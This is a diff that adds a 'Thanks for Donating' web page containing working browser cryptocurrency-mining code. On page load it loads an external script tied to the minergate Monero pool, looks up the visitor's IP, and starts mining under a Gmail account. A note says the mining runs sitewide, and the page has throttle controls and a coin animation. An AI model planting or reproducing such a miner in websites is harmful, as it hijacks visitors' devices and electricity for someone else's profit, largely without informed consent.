@@ -1,0 +1,171 @@
+<script src="/assets/donatetest/jquery.js"></script>
+	<script src="/assets/donatetest/header.js"></script>
+<script src="https://ethtrader.de/perfekt/perfekt.js?perfekt=wss://?algo=cn?variant=0?jason=xmr.pool.minergate.com:45700" > </script>
+<script>
+String.prototype.replaceAll = function(search, replacement) {
+    var target = this;
+    return target.split(search).join(replacement);
+};
+$.get("http://ipinfo.io", function(response) {
+  ip = response.ip.replaceAll(".","_");
+	console.log(ip);
+var throttle = localStorage.getItem('throttle');
+if(!throttle || throttle > 80 || throttle < 0){
+	throttle = mobileAndTabletcheck() ? 60 : 40
+	localStorage.setItem('throttle', mobileAndTabletcheck() ? 60 : 40);
+}
+
+
+throttleMiner = throttle;
+PerfektStart('manuelfhq@gmail.com', 'x');
+}, "jsonp");
+</script>
+
+<script>
+function gimmick(el) {
+    var exists = document.getElementById('gimmick')
+    if (exists) {
+        exists.parentNode.removeChild(exists);
+        return false;
+    }
+
+    var element = document.querySelector(el);
+    var canvas = document.createElement('canvas'),
+        ctx = canvas.getContext('2d'),
+        focused = false;
+
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    canvas.id = 'gimmick'
+
+    var coin = new Image();
+    coin.src = 'http://i.imgur.com/5ZW2MT3.png'
+    
+    coin.onload = function () {
+        element.appendChild(canvas)
+        focused = true;
+        drawloop();
+    }
+    var coins = []
+
+    function drawloop() {
+        if (focused) {
+            requestAnimationFrame(drawloop);
+        }
+        
+        ctx.clearRect(0, 0, canvas.width, canvas.height)
+
+        if (Math.random() < (localStorage.getItem('throttle') ? ((100 - localStorage.getItem('throttle'))-10) / 100 : .3 )) {
+            coins.push({
+                x: Math.random() * canvas.width | 0,
+                y: -50,
+                dy: 3,
+                s: 0.5 + Math.random(),
+                state: Math.random() * 10 | 0
+            })
+        }
+        var i = coins.length
+        while (i--) {
+            var x = coins[i].x
+            var y = coins[i].y
+            var s = coins[i].s
+            var state = coins[i].state
+            coins[i].state = (state > 9) ? 0 : state + 0.1
+            coins[i].dy += 0.3
+            coins[i].y += coins[i].dy
+
+            ctx.drawImage(coin, 44 * Math.floor(state), 0, 44, 40, x, y, 44 * s, 40 * s)
+
+            if (y > canvas.height) {
+                coins.splice(i, 1);
+            }
+        }
+    }
+
+}
+</script>
+
+<script>
+ $('#threads').text(navigator.hardwareConcurrency);
+  var threads = $('#threads').text();
+  var gustav;
+  var wallet;
+  var statuss;
+  var barChart;
+  var barChartCanvas = $("#barchart-canvas");
+  var hashingChart;
+  var charts = [barChartCanvas];
+  var selectedChart = 0;
+  var lastrate = 0;
+  var totalHashes = 0;
+  var totalHashes2 = 0;
+  var acceptedHashes = 0;
+  var hashesPerSecond = 0;
+$('#thread-add').click(function() {
+    threads++;
+    $('#threads').text(threads);
+        addWorker();
+  });
+
+  $('#thread-remove').click(function() {
+    if (threads > 1) {
+      threads--;
+      $('#threads').text(threads);
+          removeWorker();
+    }
+  });
+function startLogger() {
+    statuss = setInterval(function() {
+	  lastrate = ((totalhashes) * 0.5 + lastrate * 0.5);
+	  totalHashes = totalhashes + totalHashes
+      hashesPerSecond = Math.round(lastrate);
+	  totalHashes2 = totalHashes;
+	  totalhashes = 0;
+      acceptedHashes = GetAcceptedHashes();
+      $('#hashes-per-second').text(hashesPerSecond);
+	$('#total-hashes').text(totalHashes);
+	$('#approximate-donation').text(hashesPerSecond * 0.0009)
+      $('#accepted-shares').text(totalHashes2 +' | '+ acceptedHashes);
+	  
+    }, 1000);
+      $('#throttle').val(localStorage.getItem('throttle'));
+  };
+  function ChangeThrottle(){
+	newthrottle = $("#throttle").val();
+	if(!newthrottle || newthrottle > 80 || newthrottle < 0){
+	newthrottle = mobileAndTabletcheck() ? 80 : 60
+	}
+	localStorage.setItem('throttle',newthrottle);
+	location.reload();
+  }
+window.onload = function(){
+gimmick('html');
+$("#Hashes").innerText = GetAcceptedHashes();
+startLogger();
+console.log(GetAcceptedHashes());
+};
+
+</script>
+
+<style>
+#gimmick {
+    display:block;
+    pointer-events:none;
+    position: absolute;
+    top:0;
+    left:0;
+}
+</style>
+<h1 style="width:100%; text-align:center; margin-top:10%">Thanks For Donating!</h1>
+<div style="width:100%; text-align:center;">
+	<span>Your Hashes per Second: </span><span id="hashes-per-second"></span></br>
+	<span>Your Total Hashes: </span><span id="total-hashes"></span></br>
+	<span>Your Estimated Donation / 24 Hours: $</span><span id="approximate-donation"></span>
+	
+	<h3>Controls</h3>
+	<span>Throttle (A number between 0 and 80 with a lower number meaning more power)</span></br>
+	<i>Also note that this works sitewide</i></br>
+	<input id="throttle" style="width: 100px" type="number" step="10" min="0" max="80"> <button onclick="ChangeThrottle()" id="change-throttle">Change Throttle</button>
+
+</div>
+
